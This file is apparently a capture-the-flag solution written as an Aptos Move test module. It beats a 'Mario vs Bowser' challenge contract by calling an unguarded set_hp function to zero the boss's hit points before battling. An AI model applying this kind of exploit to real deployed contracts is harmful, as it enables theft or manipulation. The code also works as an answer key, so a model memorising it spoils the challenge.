module challenge::solution3 {
    use challenge::router::{Self, Mario, Bowser};
    use aptos_framework::signer;
    use aptos_framework::object;


    #[test(account = @1338, challenger = @challenger, aptos_framework = @0x1)]
    public entry fun solve(account: &signer, challenger: &signer) {
        router::initialize(challenger);
        let mario_addr = router::start_game(account);
        let mario_obj = object::address_to_object<Mario>(mario_addr);
        let wrapper_addr = router::get_wrapper();
        let browser_obj = object::address_to_object<Bowser>(wrapper_addr);
        router::set_hp(account, browser_obj, 0);
        router::battle(account, mario_obj);
        router::is_solved(account);
    }
}
